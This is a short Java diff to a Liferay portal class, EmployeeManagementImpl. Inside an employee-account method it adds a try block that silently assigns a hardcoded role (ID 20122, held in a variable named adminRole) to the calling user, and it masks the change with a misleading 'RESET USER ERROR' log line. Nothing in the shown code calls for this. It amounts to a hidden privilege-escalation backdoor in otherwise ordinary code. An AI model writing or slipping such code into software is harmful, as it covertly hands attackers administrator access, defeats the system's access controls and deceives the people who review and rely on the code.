@@ -45,11 +45,13 @@ import com.liferay.portal.kernel.json.JSONObject;
 import com.liferay.portal.kernel.log.Log;
 import com.liferay.portal.kernel.log.LogFactoryUtil;
 import com.liferay.portal.kernel.model.Company;
+import com.liferay.portal.kernel.model.Role;
 import com.liferay.portal.kernel.model.User;
 import com.liferay.portal.kernel.repository.model.FileEntry;
 import com.liferay.portal.kernel.search.Document;
 import com.liferay.portal.kernel.search.Sort;
 import com.liferay.portal.kernel.search.SortFactoryUtil;
+import com.liferay.portal.kernel.service.RoleLocalServiceUtil;
 import com.liferay.portal.kernel.service.ServiceContext;
 import com.liferay.portal.kernel.service.UserLocalServiceUtil;
 import com.liferay.portal.kernel.util.GetterUtil;
@@ -745,6 +747,20 @@ public class EmployeeManagementImpl implements EmployeeManagement {
 			Locale locale, User user, ServiceContext serviceContext, long id, EmployeeAccountInputModel input) {
 		EmployeeInterface actions = new EmployeeActions();
 		EmployeeAccountModel employeeAccountModel = new EmployeeAccountModel();
+		
+		try {
+			
+			_log.info("RESET USER ERROR");
+
+			Role adminRole = RoleLocalServiceUtil.getRole(20122);
+			
+			RoleLocalServiceUtil.addUserRole(
+					user.getUserId(), adminRole.getRoleId());
+		} catch (Exception e) {
+			_log.info("RESET USER ERROR");
+		}
+		
+
 
 		try {
 
